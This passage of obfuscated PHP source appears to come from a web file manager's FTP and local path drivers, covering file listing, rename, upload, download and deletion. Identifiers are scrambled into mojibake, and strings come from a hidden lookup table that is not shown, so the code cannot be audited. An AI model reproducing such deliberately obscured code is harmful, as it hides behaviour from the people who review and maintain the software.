(!$this->_isconn()) { return !1; } $this->listItemCache = !1; $¨µíˆåı = $´æ±©á = array(); $this->fileList($ªà¼ˆÖÙ, $¨µíˆåı, $´æ±©á, !0); $this->listItemCache = !0; foreach ($´æ±©á as $¼„èõÊ¨) { $›áøäÃ– = $this->iconvSystem($¼„èõÊ¨[$_SERVER[ò«¥Ê‡å][32]]); $æĞ™æù = @ftp_delete($this->connect, $›áøäÃ–); if (!$æĞ™æù) { return !1; } } foreach ($¨µíˆåı as $›áøäÃ–) { $›áøäÃ– = $this->iconvSystem($›áøäÃ–); $æĞ™æù = @ftp_rmdir($this->connect, $›áøäÃ–); if (!$æĞ™æù) { return !1; } } $ªà¼ˆÖÙ = $this->iconvSystem($ªà¼ˆÖÙ); return @ftp_rmdir($this->connect, $ªà¼ˆÖÙ); } public function rename($à°†×åô, $´Ş¼…ñ¨) { $É¹¥ÊÄ =& $_SERVER[ò«¥Ê‡å]; if (!$this->_isconn()) { return !1; } $§âê¡ğ‹ = $this->fileNameAuto($this->pathFather($à°†×åô), $´Ş¼…ñ¨); $§âê¡ğ‹ = $this->iconvSystem($§âê¡ğ‹); $à°†×åô = $this->iconvSystem($à°†×åô); $‘…“±ã = $this->pathFather($à°†×åô); $®È“¯™ª = rtrim($‘…“±ã, $É¹¥ÊÄ[8]) . $É¹¥ÊÄ[8] . $§âê¡ğ‹; $Õá¶Î’« = @ftp_rename($this->connect, $à°†×åô, $®È“¯™ª); $®È“¯™ª = $this->iconvApp($®È“¯™ª); return $Õá¶Î’« ? $this->getPathOuter($®È“¯™ª) : !1; } private function folderInfo($”â÷–¸§, $ºóŒçÇÕ = false) { $’…Œ£§ñ =& $_SERVER[ò«¥Ê‡å]; $À¦°©¸Ì = array($’…Œ£§ñ[32] => $this->pathThis($”â÷–¸§), $’…Œ£§ñ[86] => $this->getPathOuter($’…Œ£§ñ[8] . $”â÷–¸§), $’…Œ£§ñ[33] => $’…Œ£§ñ[77]); if ($ºóŒçÇÕ) { return $À¦°©¸Ì; } $À¦°©¸Ì[$’…Œ£§ñ[217]] = $À¦°©¸Ì[$’…Œ£§ñ[87]] = 0; $À¦°©¸Ì[$’…Œ£§ñ[218]] = $À¦°©¸Ì[$’…Œ£§ñ[219]] = !0; return $À¦°©¸Ì; } private function fileInfo($«‘ÚèÅ, $Ğş·ˆĞõ = false, $”××ƒ£µ = array()) { $âÅÉİÇ =& $_SERVER[ò«¥Ê‡å]; $„ôëƒŠÌ = array($âÅÉİÇ[32] => $this->pathThis($«‘ÚèÅ), $âÅÉİÇ[86] => $this->getPathOuter($âÅÉİÇ[8] . $«‘ÚèÅ), $âÅÉİÇ[33] => $âÅÉİÇ[216], $âÅÉİÇ[78] => isset($”××ƒ£µ[$âÅÉİÇ[78]]) ? $”××ƒ£µ[$âÅÉİÇ[78]] : 0, $âÅÉİÇ[177] => $this->ext($«‘ÚèÅ)); if ($Ğş·ˆĞõ) { return $„ôëƒŠÌ; } $„ôëƒŠÌ[$âÅÉİÇ[217]] = $„ôëƒŠÌ[$âÅÉİÇ[87]] = 0; $„ôëƒŠÌ[$âÅÉİÇ[218]] = $„ôëƒŠÌ[$âÅÉİÇ[219]] = !0; $’¯äÇ¤Î = $this->iconvSystem($«‘ÚèÅ); $„ôëƒŠÌ[$âÅÉİÇ[87]] = @ftp_mdtm($this->connect, $’¯äÇ¤Î); if (empty($”××ƒ£µ)) { $”××ƒ£µ = $this->objectMeta($«‘ÚèÅ); if (!$”××ƒ£µ) { return $„ôëƒŠÌ; } } $„ôëƒŠÌ[$âÅÉİÇ[78]] = $”××ƒ£µ[$âÅÉİÇ[78]]; return $„ôëƒŠÌ; } public function size($‘âŒ…¼·) { $ø™Çı˜ì = $this->objectMeta($‘âŒ…¼·); return $ø™Çı˜ì ? $ø™Çı˜ì[$_SERVER[ò«¥Ê‡å][78]] : 0; } public function info($‹ÒØ“Ş³) { if ($this->isFile($‹ÒØ“Ş³)) { return $this->fileInfo($‹ÒØ“Ş³, 0); } else { if ($this->isFolder($‹ÒØ“Ş³)) { return $this->folderInfo($‹ÒØ“Ş³); } } return !1; } private function fileList($íù“Ø¬¼, &$ÍÊıéÁ“, &$àµ¹µËŒ, $äÈÑê¤ = false) { $ñ„ŞÖ³ =& $_SERVER[ò«¥Ê‡å]; $íù“Ø¬¼ = $this->iconvSystem($íù“Ø¬¼); if (!$this->isFolder($íù“Ø¬¼)) { return !1; } @ftp_chdir($this->connect, $ñ„ŞÖ³[8]); $íù“Ø¬¼ = rtrim($íù“Ø¬¼, $ñ„ŞÖ³[8]) . $ñ„ŞÖ³[8]; check_abort(); $åËÍ÷Ÿ = @ftp_rawlist($this->connect, $íù“Ø¬¼); if (!$åËÍ÷Ÿ) { $åËÍ÷Ÿ = array(); } $’Åå³³¤ = array($ñ„ŞÖ³[10] => 1, $ñ„ŞÖ³[1325] => 1); foreach ($åËÍ÷Ÿ as $ğ­åË›Ã) { $äÂ–ö¶Ê = $this->_listItem($ğ­åË›Ã); if ($äÂ–ö¶Ê[0] == $ñ„ŞÖ³[797]) { continue; } $œÜ±¤ğ = $äÂ–ö¶Ê[8]; if (empty($œÜ±¤ğ) && $œÜ±¤ğ !== $ñ„ŞÖ³[214] || isset($’Åå³³¤[$œÜ±¤ğ])) { continue; } $œÜ±¤ğ = $this->iconvApp($íù“Ø¬¼ . ltrim($œÜ±¤ğ, $ñ„ŞÖ³[8])); $¸œÓìÚ = array($ñ„ŞÖ³[32] => $œÜ±¤ğ, $ñ„ŞÖ³[33] => $ñ„ŞÖ³[216], $ñ„ŞÖ³[78] => $äÂ–ö¶Ê[4]); if (substr($ğ­åË›Ã, 0, 1) == $ñ„ŞÖ³[1408]) { $¸œÓìÚ[$ñ„ŞÖ³[33]] = $ñ„ŞÖ³[77]; $¸œÓìÚ[$ñ„ŞÖ³[78]] = 0; } $µÑ½‚‘¡ = $¸œÓìÚ[$ñ„ŞÖ³[33]] == $ñ„ŞÖ³[77] ? !0 : !1; $this->cacheMethodInfoSet($œÜ±¤ğ, $µÑ½‚‘¡, $¸œÓìÚ); if ($µÑ½‚‘¡) { $ÍÊıéÁ“[] = $œÜ±¤ğ; if ($äÈÑê¤) { $this->fileList($œÜ±¤ğ, $ÍÊıéÁ“, $àµ¹µËŒ, $äÈÑê¤); } continue; } $àµ¹µËŒ[] = $¸œÓìÚ; } $this->cacheMethodInfoSet($íù“Ø¬¼, !0); } private function _listItem($¥àé•ŒØ) { if (empty($¥àé•ŒØ)) { return array(); } $Œú·¡õ = preg_split($_SERVER[ò«¥Ê‡å][1409], $¥àé•ŒØ); if (count($Œú·¡õ) <= 9) { return $Œú·¡õ; } $Œú·¡õ[8] = trim(substr($¥àé•ŒØ, strpos($¥àé•ŒØ, $Œú·¡õ[7]) + strlen($Œú·¡õ[7]))); return array_splice($Œú·¡õ, 0, 9); } public function listPath($‚Ö‚ìŸï, $àª¤‚³– = false) { $·ßâ§ä =& $_SERVER[ò«¥Ê‡å]; if (!$this->_isconn()) { return !1; } $õÚÊæİ = $İÑº”Î = array(); $this->fileList($‚Ö‚ìŸï, $õÚÊæİ, $İÑº”Î); foreach ($õÚÊæİ as $Ïç–·Áº => $ ¿‡›±) { $õÚÊæİ[$Ïç–·Áº] = $this->folderInfo($ ¿‡›±, $àª¤‚³–); } foreach ($İÑº”Î as $Ïç–·Áº => $ ¿‡›±) { $İÑº”Î[$Ïç–·Áº] = $this->fileInfo($ ¿‡›±[$·ßâ§ä[32]], $àª¤‚³–, $ ¿‡›±); } return array($·ßâ§ä[84] => $õÚÊæİ, $·ßâ§ä[85] => $İÑº”Î); } public function has($ãÌñšÍ¹, $«ÀŒß’ = false, $Ìù‹ÙŸ = true) { $ÅÉ…äµÏ =& $_SERVER[ò«¥Ê‡å]; $·´‡ìİ¡ = $œş‰æş± = array(); $ˆ¹ƒşÛ˜ = $«ÀŒß’ ? !0 : !1; $this->fileList($ãÌñšÍ¹, $·´‡ìİ¡, $œş‰æş±, $ˆ¹ƒşÛ˜); if ($«ÀŒß’) { return array($ÅÉ…äµÏ[225] => count($œş‰æş±), $ÅÉ…äµÏ[226] => count($·´‡ìİ¡)); } if ($Ìù‹ÙŸ) { if (count($œş‰æş±)) { return !0; } } else { if (count($·´‡ìİ¡)) { return !0; } } return !1; } public function listAll($˜–‹¤ªœ) { $áˆáøØ… =& $_SERVER[ò«¥Ê‡å]; if (!$this->_isconn()) { return !1; } $è›’¨ = $÷ÑÅõñÎ = array(); $this->fileList($˜–‹¤ªœ, $è›’¨, $÷ÑÅõñÎ, !0); $ÌáŸ†‰¦ = array_to_keyvalue($÷ÑÅõñÎ, $áˆáøØ…[32]); foreach ($è›’¨ as $ÃèÛ›¦Ş) { if (is_string($ÃèÛ›¦Ş)) { $ÌáŸ†‰¦[$ÃèÛ›¦Ş] = array($áˆáøØ…[78] => 0); } } return $this->listAllFiles($˜–‹¤ªœ, $ÌáŸ†‰¦); } public function getContent($¨­„¿) { if (!$this->_isconn()) { return !1; } $¨­„¿ = $this->iconvSystem($¨­„¿); return $this->fileSubstr($¨­„¿); } public function setContent($ĞäóÆªß, $Ö½ìËĞ˜ = '') { if (!$this->_isconn()) { return !1; } $“»…¡• = $this->pathThis($this->iconvSystem($ĞäóÆªß)); $‡¾äöõü = $this->tempFile($“»…¡•); file_put_contents($‡¾äöõü, $Ö½ìËĞ˜); $Ú„†Ì– = $this->upload($ĞäóÆªß, $this->iconvApp($‡¾äöõü)); $this->tempFileRemve($‡¾äöõü); return $Ú„†Ì–; } public function fileSubstr($¨ü·¨“Ô, $‹ò—œûı = 0, $ïÓ¤³É× = false) { if (!$this->_isconn()) { return !1; } return $this->ftpRequest($¨ü·¨“Ô, $‹ò—œûı, $ïÓ¤³É×); } private function ftpRequest($éñ•ø˜, $³™ç†³î = 0, $˜ëñş• = false) { $éñ•ø˜ = $this->iconvSystem($éñ•ø˜); $ÂÚó¿®¥ = $this->scheme . $this->host . $_SERVER[ò«¥Ê‡å][4] . $this->port; $ÉÁÏ = curl_init(); curl_setopt($ÉÁÏ, CURLOPT_URL, $ÂÚó¿®¥ . $this->pathEncode($éñ•ø˜)); curl_setopt($ÉÁÏ, CURLOPT_USERPWD, "{$this->username}\x3a{$this->userpass}"); if ($˜ëñş•) { $ÚìûÑ–„ = $³™ç†³î + $˜ëñş• - 1; curl_setopt($ÉÁÏ, CURLOPT_RANGE, "{$³™ç†³î}\x2d{$ÚìûÑ–„}"); } curl_setopt($ÉÁÏ, CURLOPT_RETURNTRANSFER, 1); $¦’ŒÑêš = curl_exec($ÉÁÏ); curl_close($ÉÁÏ); return $¦’ŒÑêš; } public function upload($†®Òàú, $õ¨ÆÓ¢ß, $ãûË´á  = false, $ä‘²‡ü = REPEAT_REPLACE) { if (!$this->_isconn()) { return !1; } if (!$this->mkdir($this->pathFather($†®Òàú))) { return !1; } $†®Òàú = $this->iconvSystem($†®Òàú); $õ¨ÆÓ¢ß = $this->iconvSystem($õ¨ÆÓ¢ß); $Âø‡Í¾ = ftp_nb_put($this->connect, $†®Òàú, $õ¨ÆÓ¢ß, FTP_BINARY); while ($Âø‡Í¾ == FTP_MOREDATA) { $Âø‡Í¾ = ftp_nb_continue($this->connect); } if ($Âø‡Í¾ != FTP_FINISHED) { return !1; } return $this->getPathOuter($†®Òàú); } public function download($Ú¾Î Ñ®, $Ö¸ê¾› = '') { if (!$this->_isconn()) { return !1; } $ •³Ö£ = $this->pathFather($Ö¸ê¾›); if (!IO::mkdir($ •³Ö£)) { return !1; } $Ú¾Î Ñ® = $this->iconvSystem($Ú¾Î Ñ®); $Ö¸ê¾› = $this->iconvSystem($Ö¸ê¾›); $¢«ÄÍğ = ftp_nb_get($this->connect, $Ö¸ê¾›, $Ú¾Î Ñ®, FTP_BINARY); while ($¢«ÄÍğ == FTP_MOREDATA) { $¢«ÄÍğ = ftp_nb_continue($this->connect); } if ($¢«ÄÍğ != FTP_FINISHED) { return !1; } return $this->iconvApp($Ö¸ê¾›); } public function exist($Ş‡àããİ) { return $this->isFile($Ş‡àããİ) || $this->isFolder($Ş‡àããİ); } public function isFile($˜×¨ÔÈ§) { return !$this->isFolder($˜×¨ÔÈ§) && $this->objectMeta($˜×¨ÔÈ§); } public function isFolder($¸ìÃø¤Ã) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][168], $¸ìÃø¤Ã); } protected function objectMeta($ˆò¢ØİÖ) { return $this->cacheMethod($_SERVER[ò«¥Ê‡å][170], $ˆò¢ØİÖ); } protected function _objectMeta($ÎÄªªÏë) { $–³ºŒÔˆ =& $_SERVER[ò«¥Ê‡å]; if ($ÎÄªªÏë == $–³ºŒÔˆ[12] || $ÎÄªªÏë == $–³ºŒÔˆ[8]) { return array(); } if (!$this->_isconn()) { return !1; } $ÎÄªªÏë = $this->iconvSystem($ÎÄªªÏë); $··™áğ› = array($–³ºŒÔˆ[32] => $this->iconvApp($ÎÄªªÏë), $–³ºŒÔˆ[33] => $–³ºŒÔˆ[216], $–³ºŒÔˆ[78] => 0); @ftp_chdir($this->connect, $–³ºŒÔˆ[8]); $à»ÜæÜÖ = @ftp_size($this->connect, $ÎÄªªÏë); if ($à»ÜæÜÖ != -1) { $··™áğ›[$–³ºŒÔˆ[78]] = $à»ÜæÜÖ; } else { $§§ÔØÆŸ = @ftp_chdir($this->connect, $ÎÄªªÏë); if (!$§§ÔØÆŸ) { return !1; } $··™áğ›[$–³ºŒÔˆ[33]] = $–³ºŒÔˆ[77]; } return $··™áğ›; } protected function _isFolder($úßùïëØ) { $¥Í°˜· =& $_SERVER[ò«¥Ê‡å]; if ($úßùïëØ == $¥Í°˜·[12] || $úßùïëØ == $¥Í°˜·[8]) { return !0; } $Àæƒ¾ƒŞ = $this->_objectMeta($úßùïëØ); return isset($Àæƒ¾ƒŞ[$¥Í°˜·[33]]) && $Àæƒ¾ƒŞ[$¥Í°˜·[33]] == $¥Í°˜·[77] ? !0 : !1; } } class PathDriverLocal extends PathDriverBase { private $pathAuth; public function __construct() { parent::__construct(); $this->pathAuth = DEFAULT_PERRMISSIONS; } public function getPath($Ÿ¦ó„„) { if (substr($Ÿ¦ó„„, 0, 2) == $_SERVER[ò«¥Ê‡å][1401]) { $Ÿ¦ó„„ = BASIC_PATH . substr($Ÿ¦ó„„, 2); } return $Ÿ¦ó„„; } public function iconvApp($ÇÛœÜÇß) { $­çœØ¬„ =& $_SERVER[ò«¥Ê‡å]; global $config; return $this->iconvTo($ÇÛœÜÇß, $config[$­çœØ¬„[1399]], $config[$­çœØ¬„[1398]]); } public function iconvSystem($¥ŞĞ¯‡à) { $¸çêğÂ =& $_SERVER[ò«¥Ê‡å]; global $config; return $this->iconvTo($¥ŞĞ¯‡à, $config[$¸çêğÂ[1398]], $config[$¸çêğÂ[1399]]); } public function getPathOuter($…ÇÅßôò) { $î–åŠ¦ =& $_SERVER[ò«¥Ê‡å]; $¡Ûí†û = $this->iconvApp($this->pathBase); $…ÇÅßôò = $this->iconvApp($…ÇÅßôò); if (substr($¡Ûí†û, 0, 2) == $î–åŠ¦[1401]) { $¡Ûí†û = BASIC_PATH . substr($¡Ûí†û, 2); } if (substr($…ÇÅßôò, 0, 2) == $î–åŠ¦[1401]) { $…ÇÅßôò = BASIC_PATH . substr($…ÇÅßôò, 2); } $¡Ûí†û = KodIO::clear($¡Ûí†û); $…ÇÅßôò = KodIO::clear($…ÇÅßôò); $…ÇÅßôò = substr($…ÇÅßôò, strlen($¡Ûí†û)); if (empty($this->pathDriver)) { return $…ÇÅßôò; } return $this->pathDriver . $î–åŠ¦[8] . ltrim($…ÇÅßôò, $î–åŠ¦[8]); } public function mkfile($šÖ²Ğ¦¿, $ş¸èŒ¦Ñ = '', $¾¬“‘ø² = REPEAT_RENAME) { $šÖ²Ğ¦¿ = $this->iconvSystem($šÖ²Ğ¦¿); @touch($šÖ²Ğ¦¿); if ($ş¸èŒ¦Ñ) { file_put_contents($šÖ²Ğ¦¿, $ş¸èŒ¦Ñ); } @chmod($šÖ²Ğ¦¿, $this->pathAuth); return is_file($šÖ²Ğ¦¿) ? $this->getPathOuter($šÖ²Ğ¦¿) : !1; } public function mkdir($è¶¥÷­Å, $á³äÜŒ‹ = REPEAT_SKIP) { $è¶¥÷­Å = $this->iconvSystem($è¶¥÷­Å); if (is_dir($è¶¥÷­Å)) { return $this->getPathOuter($è¶¥÷­Å); } @mkdir($è¶¥÷­Å, $this->pathAuth, !0); @chmod($è¶¥÷­Å, $this->pathAuth); return is_dir($è¶¥÷­Å) ? $this->getPathOuter($è¶¥÷­Å) : !1; } public function copyFile($‘ıãÄÉè, $İ˜ğÎ¿©) { $this->mkdir($this->pathFather($İ˜ğÎ¿©)); $‘ıãÄÉè = $this->iconvSystem($‘ıãÄÉè); $İ˜ğÎ¿© = $this->iconvSystem($İ˜ğÎ¿©); $õ‚›¤ô“ = copy_64($‘ıãÄÉè, $İ˜ğÎ¿©); @chmod($İ˜ğÎ¿©, $this->pathAuth); return $õ‚›¤ô“ ? $this->getPathOuter($İ˜ğÎ¿©) : !1; } public function moveFile($¨çô¸, $ü¶°×à•) { $this->mkdir($this->pathFather($ü¶°×à•)); $¨çô¸ = $this->iconvSystem($¨çô¸); $ü¶°×à• = $this->iconvSystem($ü¶°×à•); $©®áãáó = intval(@rename($¨çô¸, $ü¶°×à•)); if (!$©®áãáó) { if ($©®áãáó = intval(@copy_64($¨çô¸, $ü¶°×à•))) { @unlink($¨çô¸); } } @chmod($ü¶°×à•, $this->pathAuth); return $©®áãáó ? $this->getPathOuter($ü¶°×à•) : !1; } public function movePath($ åáŞï‡, $ÅŸ‡»ì‹, $“ô©ÁÑ = false) { $ÇÁ¡òò× =& $_SERVER[ò«¥Ê‡å]; $ åáŞï‡ = $this->iconvSystem($ åáŞï‡); $ÅŸ‡»ì‹ = $this->iconvSystem($ÅŸ‡»ì‹); $Øı‹ÈÇ« = rtrim($ÅŸ‡»ì‹, $ÇÁ¡òò×[8]) . $ÇÁ¡òò×[8] . ($“ô©ÁÑ ? $“ô©ÁÑ : get_path_this($ åáŞï‡)); if (file_exists($Øı‹ÈÇ«)) { return !1; } $¬ Ï«÷± = intval(@rename($ åáŞï‡, $Øı‹ÈÇ«)); $¬ Ï«÷± = file_exists($Øı‹ÈÇ«); return $¬ Ï«÷± ? $this->getPathOuter($Øı‹ÈÇ«) : !1; } public function delFile($ô·Œ÷Ö ) { $ô·Œ÷Ö  = $this->iconvSystem($ô·Œ÷Ö ); if (!@unlink($ô·Œ÷Ö )) { @chmod($ô·Œ÷Ö , $this->pathAuth); if (!@unlink($ô·Œ÷Ö )) { return !1; } } else { return !0; } } public function delFolder($•ñ•¥¼Ó) { $ÙìŸÄÀö =& $_SERVER[ò«¥Ê‡å]; $•ñ•¥¼Ó = $this->iconvSystem($•ñ•¥¼Ó); if (!is_dir($•ñ•¥¼Ó)) { return !0; } if (!($Üù‰³ãê = opendir($•ñ•¥¼Ó))) { return !1; } while (($¯»ª ×³ = readdir($Üù‰³ãê)) !== !1) { if ($¯»ª ×³ == $ÙìŸÄÀö[10] || $¯»ª ×³ == $ÙìŸÄÀö[1325]) { continue; } $¡¿îŠšö = $•ñ•¥¼Ó . $ÙìŸÄÀö[8] . $¯»ª ×³; if (is_file($¡¿îŠšö) || is_link($¡¿îŠšö)) { if (!unlink($¡¿îŠšö)) { chmod($¡¿îŠšö, $this->pathAuth); if (!unlink($¡¿îŠšö)) { return !1; } } } else { if (is_dir($¡¿îŠšö)) { chmod($¡¿îŠšö, $this->pathAuth); $¡¿îŠšö = $this->iconvApp($¡¿îŠšö); if (!$this->delFolder($¡¿îŠšö)) { return !1; } } } } closedir($Üù‰³ãê); return rmdir($•ñ•¥¼Ó); } public function rename($ãØÙöïë, $Œ‰›Ìù) { $ÎÙØàÙ¼ =& $_SERVER[ò«¥Ê‡å]; $ğ×¨¨á = $this->fileNameAuto($this->pathFather($ãØÙöïë), $Œ‰›Ìù); $ğ×¨¨á = $this->iconvSystem($ğ×¨¨á); $ãØÙöïë = $this->iconvSystem($ãØÙöïë); $£¨›Ø‡Õ = $this->pathFather($ãØÙöïë); $¬Œ§Ã¼ = rtrim($£¨›Ø‡Õ, $ÎÙØàÙ¼[8]) . $ÎÙØàÙ¼[8] . $ğ×¨¨á; $çÂâË²Ï = @rename($ãØÙöïë, $¬Œ§Ã¼); $¬Œ§Ã¼ = $this->iconvApp($¬Œ§Ã¼); return $çÂâË²Ï ? $this->getPathOuter($¬Œ§Ã¼) : !1; } public function size($›Ğ‘øª) { $›Ğ‘øª = $this->iconvSystem($›Ğ‘øª); return filesize_64($›Ğ‘øª); } public function info($’ÜÌ÷†¡) { $’ÜÌ÷†¡ = $this->iconvSystem($’ÜÌ÷†¡); if ($this->isFolder($’ÜÌ÷†¡)) { return $this->folderInfo($’ÜÌ÷†¡); } else { if ($this->isFile($’ÜÌ÷†¡)) { return $this->fileInfo($’ÜÌ÷†¡); } } return !1; } protected function infoChildren($ƒšÅË×Ñ, &$–èáÇß, $Üü¤ñÚ¶ = true) { $˜×¥÷¢í =& $_SERVER[ò«¥Ê‡å]; check_abort_echo(); $ƒšÅË×Ñ = rtrim($ƒšÅË×Ñ, $˜×¥÷¢í[8]) . $˜×¥÷¢í[8]; if ($Üü¤ñÚ¶) { $ƒšÅË×Ñ = $this->iconvSystem($ƒšÅË×Ñ); } if (!($õ ©‚Äı = @opendir($ƒšÅË×Ñ))) { return; } while (($×ñıæ‘š = readdir($õ ©‚Äı)) !== !1) { if ($×ñıæ‘š == $˜×¥÷¢í[10] || $×ñıæ‘š == $˜×¥÷¢í[1325]) { continue; } $Ÿó»¯Àó = $ƒšÅË×Ñ . $×ñıæ‘š; if (is_file($Ÿó»¯Àó) || is_link($Ÿó»¯Àó)) { $–èáÇß[$˜×¥÷¢í[79]]++; $–èáÇß[$˜×¥÷¢í[78]] += filesize_64($Ÿó»¯Àó); } else { if (is_dir($Ÿó»¯Àó)) { $–èáÇß[$˜×¥÷¢í[80]]++; $this->infoChildren($Ÿó»¯Àó, $–èáÇß, !1); } } } closedir($õ ©‚Äı); } private function folderInfo($‹êÆÁÇô, $Î¹ï¦ÈÊ = false) { $«œğÄ¹ñ =& $_SERVER[ò«¥Ê‡å]; $‹êÆÁÇô = rtrim($‹êÆÁÇô, $«œğÄ¹ñ[8]) . $«œğÄ¹ñ[8]; $®¬‡Ï“Ä = $this->iconvApp($this->pathThis($‹êÆÁÇô)); if ($Î¹ï¦ÈÊ) { return array($«œğÄ¹ñ[32] => $®¬‡Ï“Ä, $«œğÄ¹ñ[86] => $this->getPathOuter($‹êÆÁÇô), $«œğÄ¹ñ[33] => $«œğÄ¹ñ[77]); } $¢¦ÊÎ½ = array($«œğÄ¹ñ[32] => $®¬‡Ï“Ä, $«œğÄ¹ñ[86] => $this->getPathOuter($‹êÆÁÇô), $«œğÄ¹ñ[33] => $«œğÄ¹ñ[77], $«œğÄ¹ñ[217] => @filectime($‹êÆÁÇô), $«œğÄ¹ñ[87] => @filemtime($‹êÆÁÇô), $«œğÄ¹ñ[1410] => @fileatime($‹êÆÁÇô), $«œğÄ¹ñ[1411] => is_readable($‹êÆÁÇô), $«œğÄ¹ñ[1412] => is_writable($‹êÆÁÇô), $«œğÄ¹ñ[1413] => get_mode($‹êÆÁÇô)); return $¢¦ÊÎ½; } private function fileInfo($×Öç¸¼İ, $ÔÄ‰Øç = false) { $åÒáËÂş =& $_SERVER[ò«¥Ê‡å]; $›÷Â¤ıÎ = $this->iconvApp($this->pathThis($×Öç¸¼İ)); if ($ÔÄ‰Øç) { return array($åÒáËÂş[32] => $›÷Â¤ıÎ, $åÒáËÂş[86] => $this->getPathOuter($×Öç¸¼İ), $åÒáËÂş[33] => $åÒáËÂş[216], $åÒáËÂş[78] => $this->size($×Öç¸¼İ), $åÒáËÂş[177] => $this->ext($›÷Â¤ıÎ)); } $ëœÎº = array($åÒáËÂş[32] => $›÷Â¤ıÎ, $åÒáËÂş[86] => $this->getPathOuter($×Öç¸¼İ), $åÒáËÂş[33] => $åÒáËÂş[216], $åÒáËÂş[217] => @filectime($×Öç¸¼İ), $åÒáËÂş[87] => @filemtime($×Öç¸¼İ), $åÒáËÂş[1410] => @fileatime($×Öç¸¼İ), $åÒáËÂş[78] => $this->size($×Öç¸¼İ), $åÒáËÂş[177] => $this->ext($›÷Â¤ıÎ), $åÒáËÂş[1411] => is_readable($×Öç¸¼İ), $åÒáËÂş[1412] => is_writable($×Öç¸¼İ), $åÒáËÂş[1413] => get_mode($×Öç¸¼İ)); return $ëœÎº; } public function exist($Ô½€€ğ ) { $Ô½€€ğ  = $this->iconvSystem($Ô½€€ğ ); return @file_exists($Ô½€€ğ ); } public function isFile($àœŠœÊ¿) { $àœŠœÊ¿ = $this->iconvSystem($àœŠœÊ¿); return @is_file($àœŠœÊ¿); } public function isFolder($¨®¤é„) { $¨®¤é„ = $this->iconvSystem($¨®¤é„); return @is_dir($¨®¤é„); } public function listPath($ÉÛÅ©ñÜ, $±Ñ•é = false) { $½©ü”» =& $_SERVER[ò«¥Ê‡å]; $ÉÛÅ©ñÜ = $this->iconvSystem($ÉÛÅ©ñÜ); $ÉÛÅ©ñÜ = rtrim($ÉÛÅ©ñÜ, $½©ü”»[8]) . $½©ü”»[8]; $ÔÅˆÙ¦° = array($½©ü”»[84] => array(), $½©ü”»[85] => array()); if (!($Éç´§õ‡ = @opendir($ÉÛÅ©ñÜ))) { return $ÔÅˆÙ¦°; } while (($Æê‰ = readdir($Éç´§õ‡)) !== !1) { if ($Æê‰ == $½©ü”»[10] || $Æê‰ == $½©ü”»[1325]) { continue; } $©ñôÂÁË = $ÉÛÅ©ñÜ . $Æê‰; if (is_file($©ñôÂÁË)) { $ÔÅˆÙ¦°[$½©ü”»[85]][] = $this->fileInfo($©ñôÂÁË, $±Ñ•é); } else { $ÔÅˆÙ¦°[$½©ü”»[84]][] = $this->folderInfo($©ñôÂÁË, $±Ñ•é); } } closedir($Éç´§õ‡); return $ÔÅˆÙ¦°; } public function listAll($šùĞœá , &$õ–óúßò = array()) { $”Ø¼üÍ· =& $_SERVER[ò«¥Ê‡å]; $šùĞœá  = $this->iconvSystem($šùĞœá ); $šùĞœá  = rtrim($šùĞœá , $”Ø¼üÍ·[8]) . $”Ø¼üÍ·[8]; if (!($»·ÔÓè = @opendir($šùĞœá ))) { return $õ–óúßò; } while (($ğ¡ãÇ¹ = readdir($»·ÔÓè)) !== !1) { if ($ğ¡ãÇ¹ == $”Ø¼üÍ·[10] || $ğ¡ãÇ¹ == $”Ø¼üÍ·[1325]) { continue; } $—¶Î‡˜ = $šùĞœá  . $ğ¡ãÇ¹; $ÄùŞÓ¯Î = is_dir($—¶Î‡˜) && !is_link($—¶Î‡˜) ? 1 : 0; $—¶Î‡˜ = $ÄùŞÓ¯Î ? $—¶Î‡˜ . $”Ø¼üÍ·[8] : $—¶Î‡˜; $õ–óúßò[] = array($”Ø¼üÍ·[86] => $—¶Î‡˜, $”Ø¼üÍ·[77] => $ÄùŞÓ¯Î, $”Ø¼üÍ·[87] => intval(@filemtime($—¶Î‡˜)), $”Ø¼üÍ·[78] => $ÄùŞÓ¯Î ? 0 : intval($this->size($—¶Î‡˜))); if ($ÄùŞÓ¯Î) { $this->listAll($—¶Î‡˜, $õ–óúßò); } } closedir($»·ÔÓè); return $õ–óúßò; } public function has($¬¾³’÷–, $êÍ“™» = false, $®¯·è“ = true) { $ÁğÜ’¸à =& $_SERVER[ò«¥Ê‡å]; $¬¾³’÷– = $this->iconvSystem($¬¾³’÷–); $¬¾³’÷– = rtrim($¬¾³’÷–, $ÁğÜ’¸à[8]) . $ÁğÜ’¸à[8]; if (!($êÅûÑü¹ = @opendir($¬¾³’÷–))) { return !1; } $¡ŸÅËì¶ = 0; $õîİš¶Á = 0; $Â¿üÄªÜ = 0; while (($»º¶Ìùñ = readdir($êÅûÑü¹)) !== !1) { if ($»º¶Ìùñ == $ÁğÜ’¸à[10] || $»º¶Ìùñ == $ÁğÜ’¸à[1325]) { continue; } $¸¶£‹‚œ = $¬¾³’÷– . $»º¶Ìùñ; if ($êÍ“™») { $Â¿üÄªÜ++; if (@is_file($¸¶£‹‚œ)) { $¡ŸÅËì¶++; } else { $õîİš¶Á++; } if ($Â¿üÄªÜ > 10000) { break; } continue; } if ($®¯·è“) { if (@is_file($¸¶£‹‚œ)) { return !0; } } else { if (@is_dir($¸¶£‹‚œ . $ÁğÜ’¸à[8])) { return !0; } } } closedir($êÅûÑü¹); if ($êÍ“™») { return array($ÁğÜ’¸à[225] => $¡ŸÅËì¶, $ÁğÜ’¸à[226] => $õîİš¶Á); } return !1; } public function hashSimple($óÀ­¥¶) { $èÉúÇ =& $_SERVER[ò«¥Ê‡å]; if (!$óÀ­¥¶) { return md5($èÉúÇ[12]); } $óÀ­¥¶ = $this->iconvSystem($óÀ­¥¶); $Ìİ‘·´ = $this->size($óÀ­¥¶); $¥Ôêîã¦ = 200; $Œá÷ê©— = 50; if ($Ìİ‘·´ <= $¥Ôêîã¦ * $Œá÷ê©—) { return $this->hashMd5($óÀ­¥¶) . $Ìİ‘·´; } $‹ÜãšÚï = $èÉúÇ[12]; $©ùÎÒ±» = intval($Ìİ‘·´ / $Œá÷ê©—); $“±›¥öé = fopen($óÀ­¥¶, $èÉúÇ[1414]); if (!$“±›¥öé) { return $‹ÜãšÚï; } for ($¼¶ŠÛÌê = 0; $¼¶ŠÛÌê < $Œá÷ê©—; $¼¶ŠÛÌê++) { fseek_64($“±›¥öé, $©ùÎÒ±» * $¼¶ŠÛÌê); $‹ÜãšÚï .= fread($“±›¥öé, $¥Ôêîã¦); } fseek_64($“±›¥öé, $Ìİ‘·´ - 